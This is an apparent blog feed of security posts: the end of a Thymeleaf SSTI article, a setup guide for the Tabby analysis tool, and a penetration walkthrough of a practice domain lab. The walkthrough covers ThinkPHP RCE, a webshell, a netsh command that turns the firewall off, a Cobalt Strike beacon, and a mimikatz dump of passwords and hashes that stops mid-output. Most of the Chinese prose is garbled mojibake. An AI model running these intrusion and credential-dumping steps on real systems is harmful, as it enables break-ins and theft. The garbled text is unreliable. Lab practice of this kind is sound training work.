function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document, HttpServletResponse response)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>ä¸è¿‡è¿™äº›ä¿®å¤éƒ½æ¯”è¾ƒä¸´æ—¶ï¼Œè¿˜æ˜¯å‡çº§åˆ°æ–°ç‰ˆæœ¬æ¯”è¾ƒå¥½</p><p>å°±å…ˆçœ‹è¿™ä¹ˆå¤šå§ï¼Œæ–°ç‰ˆæœ¬è¿˜æœ‰ç‚¹ä¸œè¥¿æœ‰ç‚¹æ‡’äº†ä¸æƒ³å†™äº†ï¼Œä¹‹åé‡åˆ°å†å­¦ï¼Œæ¯•ç«Ÿå®æˆ˜æ„Ÿè§‰è¿™ç§sstiå¹¶ä¸ä¼šå¾ˆå¤šğŸ¥²</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD">https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘å®åœ¨æ˜¯ä¸çŸ¥é“çœ‹ä»€ä¹ˆäº†ï¼Œæ¥å­¦ä¸€ä¸‹å’Œjavaç›¸å…³çš„ä¸€äº›sstiå§ï¼Œå…ˆä»thymeleafå¼€å§‹&lt;/p&gt;
&lt;h1 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h1&gt;&lt;p&gt;Thymeleafå°±æ˜¯ä¸€ä¸ªæ¨¡æ¿æ¸²</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ssti" scheme="https://clowsman.github.io/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>Tabbyä½¿ç”¨å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-30T17:16:29.000Z</published>
    <updated>2024-12-01T06:08:16.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>è·Ÿç€å®˜æ–¹ç¯å¢ƒæ¥ï¼Œä½†æ˜¯å…·ä½“ä¸Šåˆæœ‰ç‚¹å‡ºå…¥ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹è¯¦ç»†æ­¥éª¤ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm">https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm</a></p><p>é¦–å…ˆå®˜ç½‘ä¸‹è½½tabbyçš„zipæ–‡ä»¶ï¼š<a href="https://github.com/wh1t3p1g/tabby/releases/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E9%9C%80%E8%A6%81%E7%9A%84%E4%B8%9C%E8%A5%BF%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%86">https://github.com/wh1t3p1g/tabby/releases/ï¼Œé‡Œé¢æ‰€æœ‰éœ€è¦çš„ä¸œè¥¿éƒ½åŒ…å«äº†</a></p><h2 id="æ•°æ®åº“é…ç½®"><a href="#æ•°æ®åº“é…ç½®" class="headerlink" title="æ•°æ®åº“é…ç½®"></a>æ•°æ®åº“é…ç½®</h2><p>è¿™ä¸€æ­¥æ¯”è¾ƒé‡è¦ï¼Œæ–‡æ¡£é‡Œé¢è¦çš„apocæ’ä»¶å’Œtabby-path-finderæ’ä»¶éƒ½åŒ…å«åœ¨å®˜æ–¹çš„zipé‡Œé¢äº†</p><p>ç„¶åæ–°å»ºä¸€ä¸ªNeo4jé¡¹ç›®æ¥ç»™tabbyä½¿ç”¨ï¼ŒåŒæ—¶åˆ›å»ºä¸€ä¸ªDBMS</p><p><img src="https://cdn.clown2024.cn/image-20241201012220397.png" alt="image-20241201012220397"></p><p>é‡Œé¢æœ‰ä¸€ä¸ªé»˜è®¤çš„neo4jæ•°æ®åº“ï¼Œç”¨è¿™ä¸ªå°±å¥½äº†</p><p>ç„¶åé…ç½®tabbyçš„æ•°æ®åº“è´¦å·å¯†ç ï¼Œtabby &gt;&#x3D; 1.3.x ç‰ˆæœ¬çš„æ•°æ®åº“é…ç½®æ”¾ç½®äº <code>config/db.properties</code>ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ‰‹åŠ¨åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># for docker<br>tabby.cache.isDockerImportPath            = false<br><br># db settings<br>tabby.neo4j.username                      = neo4j<br>tabby.neo4j.password                      = password<br>tabby.neo4j.url                           = bolt://127.0.0.1:7687<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201012611132.png" alt="image-20241201012611132"></p><p>ç„¶åé…ç½®ä¸€ä¸‹æˆ‘ä»¬åˆšæ–°å»ºçš„æ•°æ®åº“</p><p>ç‚¹è¿™é‡Œè¿›å»</p><p><img src="https://cdn.clown2024.cn/image-20241201012904191.png" alt="image-20241201012904191"></p><p><img src="https://cdn.clown2024.cn/image-20241201012920619.png" alt="image-20241201012920619"></p><p>ç„¶åæ‰¾åˆ°å¯¹åº”çš„é…ç½®é¡¹ï¼Œä¿®æ”¹ä¸‹é¢è¿™äº›å†…å®¹ï¼Œæ²¡æœ‰å°±è‡ªå·±åˆ›å»º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># æ³¨é‡Šä¸‹é¢çš„é…ç½®ï¼Œå…è®¸ä»æœ¬åœ°ä»»æ„ä½ç½®è½½å…¥csvæ–‡ä»¶<br>#server.directories.import=import<br><br># å…è®¸ apoc æ‰©å±•<br>dbms.security.procedures.unrestricted=jwt.security.*,apoc.*<br><br># ä¿®æ”¹å†…å­˜ç›¸å…³é…ç½® <br># å¯ä»¥é€šè¿‡å®˜æ–¹çš„neo4j-adminæ¥æ¨èé…ç½®å†…å­˜å¤§å°ï¼Œhttps://neo4j.com/docs/operations-manual/current/tools/neo4j-admin/neo4j-admin-memrec/<br>dbms.memory.heap.initial_size=1G<br>dbms.memory.heap.max_size=4G<br>dbms.memory.pagecache.size=4G<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯é…ç½®apocï¼Œå…ˆæ‰¾åˆ°é…ç½®æ–‡ä»¶çš„ç›®å½•</p><p>ç‚¹å‡»è¿™é‡Œä¼šç›´æ¥æ‰“å¼€å½“å‰é¡¹ç›®çš„é…ç½®æ–‡ä»¶ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241201013409500.png" alt="image-20241201013409500"></p><p><img src="https://cdn.clown2024.cn/image-20241201013343735.png" alt="image-20241201013343735"></p><p>æ–°å»ºapoc.confæ–‡ä»¶ï¼Œé…ç½®ä¸‹é¢å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">apoc.import.file.enabled=true<br>apoc.import.file.use_neo4j_config=false<br></code></pre></td></tr></table></figure><p>æœ€åé…ç½®ä¸€ä¸‹ apoc å’Œ tabby-path-finder æ’ä»¶ï¼Œæ‰“å¼€ plugins ç›®å½•å°†å¯¹åº”çš„ jar å¤åˆ¶åˆ°è¯¥ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241201013423656.png" alt="image-20241201013423656"></p><p>è¿™é‡Œä¸‹è½½çš„ä¸¤ä¸ªæ’ä»¶ç‰ˆæœ¬æœ‰è®²ç©¶ï¼Œä¸€å¼€å§‹æ¼çœ‹äº†ï¼Œå¯¼è‡´æ’ä»¶åŠ è½½å®Œæ•°æ®åº“éƒ½èµ·ä¸æ¥</p><blockquote><p>å…³äº apoc æ’ä»¶çš„ç‰ˆæœ¬é€‰æ‹©æ–¹æ³•ï¼šNeo4j æ•°æ®åº“ç‰ˆæœ¬çš„å‰ä¸¤ä½å¯¹åº” apoc æ’ä»¶çš„ç‰ˆæœ¬<br>æ¯”å¦‚ æˆ‘Neo4j æ•°æ®åº“ç‰ˆæœ¬ä¸º v5.24.0ï¼Œåˆ™é€‰æ‹© apoc æ’ä»¶ v5.2.x ç‰ˆæœ¬</p></blockquote><p>æˆ‘è¿™é‡Œå°±é€‰äº†ä¸¤ä¸ª5.24çš„</p><p><img src="https://cdn.clown2024.cn/image-20241201020830325.png" alt="image-20241201020830325"></p><p>ä¸Šè¿°æ­¥éª¤å®Œæˆä¹‹åé‡å¯æ•°æ®åº“</p><p>è¾“å…¥ä¸‹é¢ä¸¤ä¸ªæŒ‡ä»¤æ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CALL apoc.help(&#x27;all&#x27;)<br>CALL tabby.help(&#x27;tabby&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201020937163.png" alt="image-20241201020937163"></p><p>ç„¶åå°±æ˜¯é…ç½®å›¾æ•°æ®åº“ç´¢å¼•ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†åŠ å¿«å¯¼å…¥&#x2F;åˆ é™¤çš„é€Ÿåº¦ï¼Œæå‰å¯¹èŠ‚ç‚¹è¿›è¡Œç´¢å¼•å»ºç«‹</p><p>æ‰§è¡Œä¸‹é¢çš„cypherè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>:schema //æŸ¥çœ‹è¡¨åº“<br>:sysinfo //æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201021159909.png" alt="image-20241201021159909"></p><p><img src="https://cdn.clown2024.cn/image-20241201021255464.png" alt="image-20241201021255464"></p><p>è¿™æ˜¯åˆ é™¤æ‰€æœ‰çº¦æŸçš„è¯­å¥ï¼Œæœ‰éœ€è¦å¯ä»¥ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">DROP CONSTRAINT c1;<br>DROP CONSTRAINT c2;<br>DROP CONSTRAINT c3;<br>DROP CONSTRAINT c4;<br>DROP INDEX index1;<br>DROP INDEX index2;<br>DROP INDEX index3;<br>DROP INDEX index4;<br>DROP INDEX index5;<br>DROP INDEX index6;<br>DROP INDEX index7;<br></code></pre></td></tr></table></figure><h2 id="ideaæ’ä»¶å®‰è£…"><a href="#ideaæ’ä»¶å®‰è£…" class="headerlink" title="ideaæ’ä»¶å®‰è£…"></a>ideaæ’ä»¶å®‰è£…</h2><p>è¯¥æ’ä»¶æ˜¯ç”¨æ¥åŠ é€Ÿæˆ‘ä»¬çš„åˆ†æè¿‡ç¨‹çš„ï¼Œé€šå¸¸ä¸€æ¬¡å®Œæ•´çš„tabbyä½¿ç”¨æµç¨‹ä¸ºä¸‹é¢å‡ æ­¥ï¼š</p><ol><li>ç”Ÿæˆä»£ç å±æ€§å›¾</li><li>å¯¼å…¥å›¾æ•°æ®åº“neo4j</li><li>ä½¿ç”¨browseræŸ¥è¯¢æŒ‡å®šcypherè¯­å¥</li><li>å¤åˆ¶å¯¹åº”çš„classnameç­‰ä¿¡æ¯ååœ¨IDEAå®šä½åˆ°å¯¹åº”ä»£ç è¿›è¡Œäººå·¥ç¡®è®¤</li></ol><p>æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¸‹è½½å®‰è£…æ’ä»¶ï¼Œæ’ä»¶åœ°å€ï¼š<a href="https://github.com/wh1t3p1g/tabby-intellij-plugin">https://github.com/wh1t3p1g/tabby-intellij-plugin</a></p><p>ä¸‹è½½å¥½æ˜¯ä¸€ä¸ªzipæ–‡ä»¶ï¼Œç„¶åå»ideaçš„æ’ä»¶å¸‚åœºé€‰æ‹©ä»ç£ç›˜å®‰è£…æ’ä»¶</p><p><img src="https://cdn.clown2024.cn/image-20241201021913952.png" alt="image-20241201021913952"></p><p>ç›´æ¥é€‰æ‹©æˆ‘ä»¬çš„zipæ–‡ä»¶ï¼Œä¸‹è½½å¥½åå¯ä»¥åœ¨å·²å®‰è£…æ’ä»¶ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241201022205930.png" alt="image-20241201022205930"></p><p>ç„¶åé…ç½®å¯¹åº”çš„æ•°æ®æº</p><p><img src="https://cdn.clown2024.cn/image-20241201022319862.png" alt="image-20241201022319862"></p><h1 id="è¿è¡Œç¤ºä¾‹"><a href="#è¿è¡Œç¤ºä¾‹" class="headerlink" title="è¿è¡Œç¤ºä¾‹"></a>è¿è¡Œç¤ºä¾‹</h1><p>è¿™é‡Œåœ¨caseç›®å½•é‡Œé¢æ”¾äº†ä¸€ä¸ªcc3.2.1çš„ä¾èµ–</p><p>ç„¶åä¸‹é¢å‘½ä»¤å¼€å§‹åˆ†æç”Ÿæˆæ•°æ®</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -Xmx4g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨outputç›®å½•ä¸‹ç”Ÿæˆä¸€ç³»åˆ—csvæ–‡ä»¶</p><p><img src="https://cdn.clown2024.cn/image-20241201140610659.png" alt="image-20241201140610659"></p><p>é«˜ç‰ˆæœ¬éœ€è¦ä½¿ç”¨tabby-vul-finderæ¥æ‰‹åŠ¨å¯¼å…¥ç”Ÿæˆçš„ç»“æœåˆ°å›¾æ•°æ®åº“ä¸­ï¼Œæ–‡ä»¶åœ°å€ï¼š<a href="https://github.com/wh1t3p1g/tabby-vul-finder">https://github.com/wh1t3p1g/tabby-vul-finder</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -jar tabby-vul-finder.jar load D:\CTF\Java\å·¥å…·\tabby\output\dev<br></code></pre></td></tr></table></figure><p>è¿™æ ·å³å¯å®Œæˆå¯¼å…¥</p><p><img src="https://cdn.clown2024.cn/image-20241201140654291.png" alt="image-20241201140654291"></p><p>å±æ€§å›¾çš„ä»‹ç»åœ¨å®˜æ–¹æ–‡æ¡£é‡Œæœ‰è¯´æ˜ï¼š<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4">https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒé…ç½®&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;/a&gt;ç¯å¢ƒé…ç½®&lt;/h1&gt;&lt;p&gt;è·Ÿç€å®˜æ–¹ç¯å¢ƒæ¥ï¼Œä½†æ˜¯å…·ä½“ä¸Šåˆæœ‰ç‚¹å‡ºå…¥ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹è¯¦ç»†æ­¥éª¤ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š&lt;a href=&quot;https://www.yuque.</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºäº”</title>
    <link href="https://clowsman.github.io/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/"/>
    <id>https://clowsman.github.io/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/</id>
    <published>2024-11-20T17:01:38.000Z</published>
    <updated>2024-11-21T10:36:53.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p><strong>è™šæ‹Ÿæœºå¯†ç </strong></p><p><strong>win7</strong></p><p>sun\heart 123.com</p><p>sun\Administrator dc123.comï¼ˆå› ä¸ºè¿‡æœŸäº†ï¼Œæ”¹æˆAdmin12345ï¼‰</p><p><strong>2008</strong></p><p>sun\admin 2020.comï¼ˆæ”¹æˆ2022.comï¼‰</p><p>Win7åŒç½‘å¡æ¨¡æ‹Ÿå†…å¤–ç½‘</p><p>ä»…ä¸»æœºæ¨¡å¼ç½‘å¡ï¼š192.168.138.0</p><p>NATæ¨¡å¼ç½‘å¡ï¼š192.168.135.0</p><p>é…ç½®å¥½åéœ€è¦è¿›å…¥win7ä¸»æœºå°†phpstudyæœåŠ¡å¼€èµ·æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241121125028618.png" alt="image-20241121125028618"></p><p>emmmè¯•äº†ä¸€ä¸‹åˆæ˜¯ä¸èƒ½pingé€šçš„ï¼Œä½†æ˜¯ç½‘é¡µèƒ½æ­£å¸¸è®¿é—®</p><h1 id="è€ƒç‚¹æ€è·¯"><a href="#è€ƒç‚¹æ€è·¯" class="headerlink" title="è€ƒç‚¹æ€è·¯"></a>è€ƒç‚¹æ€è·¯</h1><p><strong>ä¸€ã€ç¯å¢ƒæ­å»º</strong></p><ul><li><p>1.ç¯å¢ƒæ­å»ºæµ‹è¯•</p></li><li><p>2.ä¿¡æ¯æ”¶é›†</p></li></ul><p><strong>äºŒã€æ¼æ´åˆ©ç”¨</strong></p><ul><li><p>3.æ¼æ´æœç´¢ä¸åˆ©ç”¨</p></li><li><p>4.æ¼æ´åˆ©ç”¨Getshell</p></li><li><p>5.ç³»ç»Ÿä¿¡æ¯æ”¶é›†</p></li><li><p>6.ä¸»æœºå¯†ç æ”¶é›†</p></li></ul><p><strong>ä¸‰ã€å†…ç½‘æœé›†</strong></p><ul><li><p>7.å†…ç½‘â€“ç»§ç»­ä¿¡æ¯æ”¶é›†</p></li><li><p>8.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“MS14-058</p></li><li><p>9.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“MS17-010</p></li></ul><p><strong>å››ã€æ¨ªå‘ç§»åŠ¨</strong></p><ul><li><p>10.psexecè¿œæ§</p></li><li><p>11.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£</p></li><li><p>12.netshå¢åˆ é˜²ç«å¢™è§„åˆ™</p></li></ul><p><strong>äº”ã€æ„å»ºé€šé“</strong></p><ul><li>13.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘</li></ul><p><strong>å…­ã€æŒä¹…æ§åˆ¶</strong></p><ul><li><p>14.åŸŸæ¸—é€-åŸŸæˆå‘˜ä¿¡æ¯æ”¶é›†</p></li><li><p>15.åŸŸæ¸—é€-åŸºç¡€æœåŠ¡å¼±å£ä»¤æ¢æµ‹åŠæ·±åº¦åˆ©ç”¨ä¹‹powershell</p></li><li><p>16.åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨]</p></li><li><p>17.åŸŸæ¸—é€-åŸŸæ§å®ç°ä¸åˆ©ç”¨</p></li></ul><p><strong>ä¸ƒã€ç—•è¿¹æ¸…ç†</strong></p><ul><li>18ã€æ—¥å¿—æ¸…ç†</li></ul><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><p>å…ˆarp-scan -lçœ‹ä¸€ä¸‹å­˜æ´»ä¸»æœº</p><p><img src="https://cdn.clown2024.cn/image-20241121125732100.png" alt="image-20241121125732100"></p><p>æ‹¿åˆ°webæœåŠ¡å™¨åœ°å€ï¼š192.168.135.150</p><p>åšä¸€ä¸‹ç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sS -v 192.168.135.150<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸¤ä¸ªç«¯å£ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PORT     STATE SERVICE<br>80/tcp   open  http<br>3306/tcp open  mysql<br></code></pre></td></tr></table></figure><p>ç„¶åfscanæ‰«å‡ºæ¥ä¸€ä¸ª135ç«¯å£å¼€æ”¾ï¼Œä½†æ˜¯æˆ‘çš„fscanæ¼æ´æ¢æµ‹ä¸äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬æ‰‹åŠ¨å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121130427924.png" alt="image-20241121130427924"></p><p>è®¿é—®ä¸€ä¸‹80ç«¯å£çš„æœåŠ¡å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªthinkphp5çš„æœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241121125627193.png" alt="image-20241121125627193"></p><p>ç”¨å·¥å…·ï¼š<a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3%E6%88%96%E8%80%85https://github.com/bewhale/thinkphp_gui_tools%E7%9C%8B%E7%9C%8B%E8%83%BD%E4%B8%8D%E8%83%BD%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%9C%80%E5%A5%BD%E4%BD%BF%E7%94%A8java8%E6%9D%A5%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E5%8E%BBOracle%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AAjava8%E7%9A%84jdk">https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3æˆ–è€…https://github.com/bewhale/thinkphp_gui_toolsçœ‹çœ‹èƒ½ä¸èƒ½ä¸€æŠŠæ¢­ï¼Œä¸è¿‡æœ€å¥½ä½¿ç”¨java8æ¥è¿è¡Œï¼Œè¿™é‡Œå¯ä»¥å»Oracleä¸‹è½½ä¸€ä¸ªjava8çš„jdk</a></p><p><img src="https://cdn.clown2024.cn/image-20241121132256316.png" alt="image-20241121132256316"></p><p>è§£å‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">tar -xzvf jdk-8u401-linux-x64.tar.gz <br></code></pre></td></tr></table></figure><blockquote><p>æœ‰ç‚¹ç”·æ³µï¼Œè¿™å°kaliä¸€ç›´è¯´æˆ‘è¶…å†…å­˜ï¼Œæˆ‘æ¢äº†ä¸€å°kaliå°±å¯ä»¥äº†</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241121161223838.png" alt="image-20241121161223838"></p><p>å¯ä»¥çœ‹åˆ°æ‰«å‡ºäº†å››ä¸ªæ´äº†ï¼Œè¿™ä¸‹å¯ä»¥ä¸€æŠŠæ¢­äº†</p><p>é€‰æ‹©å¯¹åº”pocæ‰§è¡Œä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121161320128.png" alt="image-20241121161320128"></p><p>å‘ç°å¯ä»¥æˆåŠŸï¼Œé‚£è¿™æ—¶å€™å°±ç›´æ¥getshellèšå‰‘è¿ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121162241375.png" alt="image-20241121162241375"></p><p><img src="https://cdn.clown2024.cn/image-20241121162256002.png" alt="image-20241121162256002"></p><p>æˆåŠŸè¿æ¥</p><p>ä¸è¿‡ä¸ºäº†æ–¹ä¾¿ä¸Šä¼ csé©¬è¿™é‡Œè¿˜æ˜¯ä¸Šä¼ ä¸€ä¸ªå†°èé©¬æ¥è¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241121163421297.png" alt="image-20241121163421297"></p><p>ç„¶åå…³ä¸€ä¸‹é˜²ç«å¢™å…ˆ</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121163742545.png" alt="image-20241121163742545"></p><p>ç„¶åä¸Šä¼ ä¸€ä¸ªcsçš„æœ¨é©¬</p><p><img src="https://cdn.clown2024.cn/image-20241121164338443.png" alt="image-20241121164338443"></p><p>ç„¶åè¿è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241121164413507.png" alt="image-20241121164413507"></p><p>å¯ä»¥çœ‹åˆ°ä¸»æœºæˆåŠŸä¸Šçº¿</p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><p>å¸¸è§„net viewçœ‹ä¸€ä¸‹ä¸»æœº</p><p><img src="https://cdn.clown2024.cn/image-20241121164636888.png" alt="image-20241121164636888"></p><p>å¯ä»¥çœ‹åˆ°åŸŸæ§çš„åœ°å€ä¸ºï¼š192.168.138.138</p><p>ç„¶åmimikatzè¿›è¡Œlogonpasswordsæ‹¿ä¸€ä¸‹å¯†ç ä¿¡æ¯</p><p><img src="https://cdn.clown2024.cn/image-20241121164833388.png" alt="image-20241121164833388"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Authentication Id : 0 ; 151193 (00000000:00024e99)<br>Session           : Interactive from 1<br>User Name         : Administrator<br>Domain            : SUN<br>Logon Server      : DC<br>Logon Time        : 2024/11/21 12:44:44<br>SID               : S-1-5-21-3388020223-1982701712-4030140183-500<br>msv :<br> [00000003] Primary<br> * Username : Administrator<br> * Domain   : SUN<br> * LM       : ac804745ee68ebea48116059303a4365<br> * NTLM     : ccef208c6485269c20db2cad21734fe7<br> * SHA1     : 58d1a25c09f4ee98209941b2b333fbe477d472a9<br>tspkg :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>wdigest :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>kerberos :<br> * Username : Administrator<br> * Domain   : SUN.COM<br> * Password : Admin12345<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 997 (00000000:000003e5)<br>Session           : Service from 0<br>User Name         : LOCAL SERVICE<br>Domain            : NT AUTHORITY<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-19<br>msv :<br>tspkg :<br>wdigest :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>kerberos :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 996 (00000000:000003e4)<br>Session           : Service from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-20<br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c 